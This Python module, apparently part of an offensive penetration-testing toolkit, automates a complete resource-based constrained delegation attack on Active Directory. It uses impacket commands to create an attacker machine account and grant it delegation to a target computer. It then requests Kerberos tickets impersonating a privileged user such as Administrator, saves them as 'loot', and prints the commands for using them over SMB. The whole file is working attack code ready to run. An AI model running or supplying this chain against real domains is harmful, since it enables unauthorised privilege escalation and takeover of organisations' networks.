# modules/attack_rbcd.py

import os
from core.colors import blue, green, red, yellow
from core.helpers import run_command, save_loot
from datetime import datetime


def attack_rbcd(session, *args):
    print(blue("[*] Executing full RBCD attack chain..."))

    domain = session.domain
    dc_ip = session.dc_ip
    username = session.username
    password = session.password or ''
    hash_val = session.hash or ''

    target = input("[?] Target computer name (e.g. DC01): ").strip().strip('$')
    attacker_pc = input("[?] Attacker computer name to create (e.g. FAKEBOX): ").strip().strip('$')
    attacker_pass = input("[?] Attacker computer password: ").strip()
    impersonate = input("[?] User to impersonate (e.g. Administrator): ").strip()

    os.makedirs("loot", exist_ok=True)

    # Auth string for impacket tools
    if hash_val:
        auth_str = f"-hashes :{hash_val} {domain}/{username}"
    else:
        auth_str = f"{domain}/{username}:'{password}'"

    # Step 1: Add attacker machine account
    print(blue("\n[*] Step 1: Adding attacker machine account..."))
    cmd1 = (
        f"impacket-addcomputer -method LDAPS "
        f"-computer-name '{attacker_pc}$' -computer-pass '{attacker_pass}' "
        f"-dc-ip {dc_ip} -domain-netbios {domain} {auth_str}"
    )
    out, err = run_command(cmd1)
    output = out or err
    print(output)
    if "successfully" not in output.lower() and "already exists" not in output.lower():
        print(yellow("[!] Machine account creation may have failed. Continuing anyway..."))

    # Step 2: Configure RBCD delegation
    print(blue("\n[*] Step 2: Configuring RBCD delegation on target..."))
    cmd2 = (
        f"impacket-rbcd -delegate-from '{attacker_pc}$' -delegate-to '{target}$' "
        f"-action write {auth_str} -dc-ip {dc_ip}"
    )
    out, err = run_command(cmd2)
    print(out or err)

    # Step 3: Get TGT for attacker machine account
    print(blue("\n[*] Step 3: Requesting TGT for attacker machine account..."))
    cmd3 = (
        f"impacket-getTGT {domain}/{attacker_pc}$:'{attacker_pass}' -dc-ip {dc_ip}"
    )
    out, err = run_command(cmd3)
    print(out or err)

    tgt_file = f"{attacker_pc}$.ccache"
    if not os.path.exists(tgt_file):
        print(red("[-] TGT file not found after getTGT. Aborting."))
        print(yellow("[!] Ensure impacket-getTGT is in PATH and credentials are correct."))
        return

    tgt_loot = os.path.join("loot", tgt_file)
    os.rename(tgt_file, tgt_loot)
    print(green(f"[+] TGT saved: {tgt_loot}"))

    # Step 4: Request service ticket via S4U2Proxy
    print(blue(f"\n[*] Step 4: Requesting service ticket for '{impersonate}' via S4U2Proxy..."))
    spn = f"cifs/{target.lower()}.{domain.lower()}"
    env = {"KRB5CCNAME": tgt_loot}
    cmd4 = (
        f"impacket-getST -spn '{spn}' -impersonate {impersonate} "
        f"{domain}/{attacker_pc}$:'{attacker_pass}' -dc-ip {dc_ip}"
    )
    out, err = run_command(cmd4, env=env)
    print(out or err)

    # impacket-getST names the file: <user>@<spn_normalized>@<REALM>.ccache
    st_name = f"{impersonate}@cifs_{target.lower()}.{domain.lower()}@{domain.upper()}.ccache"
    st_loot = os.path.join("loot", f"{impersonate}@cifs_{target.lower()}.ccache")
    if os.path.exists(st_name):
        os.rename(st_name, st_loot)
        print(green(f"\n[+] Service ticket saved: {st_loot}"))
        print(green(f"[+] To use: export KRB5CCNAME={st_loot}"))
        print(green(f"[+] Then:   impacket-smbclient -k -no-pass {impersonate}@{target.lower()}.{domain.lower()}"))
    else:
        print(yellow(f"[!] Service ticket not found at expected path: {st_name}"))
        print(yellow("[!] Check the output above and look for .ccache files in the current directory."))
